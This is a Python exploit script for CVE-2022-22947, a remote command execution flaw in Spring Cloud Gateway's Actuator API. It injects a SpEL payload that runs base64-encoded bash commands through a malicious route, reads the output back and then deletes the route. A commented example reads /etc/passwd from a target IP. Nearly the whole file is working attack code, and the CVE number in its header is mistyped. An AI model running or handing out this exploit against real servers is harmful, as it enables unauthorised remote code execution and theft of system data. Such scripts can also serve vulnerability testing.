#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Time       : 2023/4/13 21:47
# Author     : yunkong
# FileName   : cve_2022_22947_cmd.py
# Description:
#
# Exploit Title: Spring Cloud Gateway Actuator API SpEL表达式注入命令执行（CVE-2022-22947）
# Version: (3.1.x)< 3.1.1; (3.0.x)< 3.0.7; 其他已不再更新的版本
# CVE: CVE-2022-2294
import base64
import json
import time

import requests

headers1 = {
    'Accept-Encoding': 'gzip, deflate',
    'Accept': '*/*',
    'Accept-Language': 'en',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    'Content-Type': 'application/json'
}

headers2 = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded'
}

data_payload = '''{
  "id": "hacktest",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\\"bash -c {echo,target_command}|{base64,-d}|{bash,-i}\\").getInputStream()))}"
    }
  }],
  "uri": "http://example.com"
}'''

proxy = {
    "http": "127.0.0.1:8080",
    "https": "127.0.0.1:8080"
}


def exploit(target_url, command):
    # 将command进行Base64编码
    bytes_string = command.encode('utf-8')
    encoded_bytes = base64.b64encode(bytes_string)
    command = encoded_bytes.decode('utf-8')

    try:
        re1 = requests.post(url=target_url + "/actuator/gateway/routes/hacktest", data=data_payload.replace("target_command", command),
                            headers=headers1,
                            proxies=proxy,
                            json=json,
                            timeout=10)
        if re1.status_code != 201:
            print(f"[-] Exploit failure, route addition failed!")
            return False
        re2 = requests.post(url=target_url + "/actuator/gateway/refresh", headers=headers2)
        re3 = requests.get(url=target_url + "/actuator/gateway/routes/hacktest", proxies=proxy,headers=headers2)
        if re3.status_code != 200:
            print(f"[*] Unable to view exploit results, It may be that this command will not display the results!")
            return False
        else:
            requests.delete(url=target_url + "/actuator/gateway/routes/hacktest", headers=headers2)
            requests.post(url=target_url + "/actuator/gateway/refresh", headers=headers2)
            print(f"[+] The exploit was successful, and the following command results:")
            print(f"------------------------------------------------------------------------------------")
            res = json.dumps(json.loads(re3.text)['filters'][0], ensure_ascii=False).replace("\"[[AddResponseHeader Result = '", "").replace("'], order = 1]\"", "").replace("\\n", "\n")
            print(res)
            print(f"------------------------------------------------------------------------------------")
            return True
    except:
        print(f"[-] Exploit failure, unable to access the target host!")


def vuln_exploit_start(target_url, command):
    exploit(target_url, command)


# vuln_exploit_start("http://192.168.12.10:880", "cat /etc/passwd")
